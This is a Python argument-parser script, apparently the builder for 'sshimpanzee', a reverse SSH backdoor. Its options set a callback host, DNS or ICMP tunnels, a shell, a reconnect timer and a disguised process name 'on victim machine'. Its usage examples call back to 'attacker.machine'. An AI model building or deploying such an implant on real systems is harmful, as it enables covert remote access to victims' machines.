import argparse
import textwrap

parser = argparse.ArgumentParser(description='Builder for Reverse SSHD server.', conflict_handler='resolve', formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''Please provide at least a remote address or a tunnel.
Examples:
./builder.py -r attacker.machine:4444
./builder.py --tun dns,dnsserv=attacker.machine
./builder.py --tun icmp,remote=192.168.0.1'''))

parser.add_argument('--remote', '-r', type=str,
                    help='Remote Host:Port')

parser.add_argument('--no-keygen', dest='keygen', action='store_const',
                    const=False, default=True,
                    help='Do not generate key')
parser.add_argument('--no-reconf', dest='reconf', action='store_const',
                    const=False, default=True,
                    help='Do not rerun ./configure before building')
parser.add_argument('--no-musl', dest='musl', action='store_const', default=True, const=False,
                    help='Avoid building musl lib, usefull if cross-compiling')
parser.add_argument('--no-make', dest='no_make', action='store_const',
                    const=True, default=False,
                    help='Only generate sshd.h, keys and makefile, do not build')
parser.add_argument('--no-banner', dest='no_banner', action='store_const',
                    const=True, default=False,
                    help='Do not put the sshimpanzee banner in sshd')

parser.add_argument('--tunnel', dest='tun', nargs='?', type=str,
                    help=' Tunnelling using various method, try --tun help to get the complete list of tunnels and their related options')


parser.add_argument('--verbose', '-v', dest='verbose', action='count',
                    default=0,
                    help='Verbosity level, -v -vv')
parser.add_argument('--cross-comp', dest='cross_comp',
                    nargs="?", default=False, type=str,
                    help='host as passed to configure')
parser.add_argument('--compiler', '--cc', '-C', dest='compiler',
                    help='Compiler to be used', default='musl-gcc')
parser.add_argument('--extra-cflags', dest='extra_cflags', nargs='?', type=str,
                    help='Extra parameters to pass as cflags to openssh and dependancies (usefull for cross compilation)', default="")
parser.add_argument('--extra-ldflags',  dest='extra_ldflags', nargs='?', type=str,
                    help='Extra parameters to pass as ldflags to openssh and dependancies (usefull for cross compilation)', default="")
parser.add_argument('--public-key', '-k',  dest='public_key', nargs='?', type=str,
                    help='Public key to use for client authentication')
parser.add_argument('--shell', '-s',  dest='shell', nargs='?', type=str,
                    help='User shell, default to /bin/sh', default="/bin/sh")
parser.add_argument('--timer', '-t',  dest='timer', nargs='?', type=str,
                    help='Timer between 2 reverse connection attempt in microsecond). (default 60*1000*1000, 1 minute)', default="60*1000*1000")

parser.add_argument('--force-clean-build', dest='force_clean_build', action='store_const', default=False, const=True, help='clean and rebuild dependancies (musl and openssh)')

parser.add_argument('--proc-name', '-P', dest='process_name', action='store', default='sshimpanzee', help='Process name on victim machine')


args = parser.parse_args()

